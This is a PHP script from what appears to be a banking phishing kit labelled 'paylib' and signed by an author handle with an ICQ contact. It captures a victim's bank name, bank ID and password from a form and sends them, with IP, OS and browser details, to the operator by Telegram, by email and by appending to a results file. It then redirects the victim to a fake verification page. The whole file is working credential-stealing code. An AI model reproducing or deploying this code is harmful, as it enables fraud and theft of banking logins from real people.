<?php
session_start();
error_reporting(0);
/*

Author : H3L13M
ICQ : @651198700
ICQ : @651198700

*/

if(isset($_POST['bankname']) ){
include "../config.php";
include "inc/funcs.php";


$subject = "[paylib] [LOGIN] INFO from $ip";

$info1 = $_POST['bankname'];
$info2 = $_POST['bankid'];
$info3 = $_POST['bankpass'];

$message = "bankname: $info1\nbankid: $info2\nbankpass: $info3\nOS: ".getOs($_SERVER['HTTP_USER_AGENT'])."\nBrowser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\nIP : $ip\nAgent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";

toTG($message);
mail($email,$subject,$message);


$op = fopen($resText,'a+');
fwrite($op,$message);
fclose($op);

echo "<meta http-equiv=\"Refresh\" content=\"0; url=../instant-verification.php\" />";
}
else{

	echo "<meta http-equiv=\"Refresh\" content=\"0; url=../index.php\" />";
}
?>
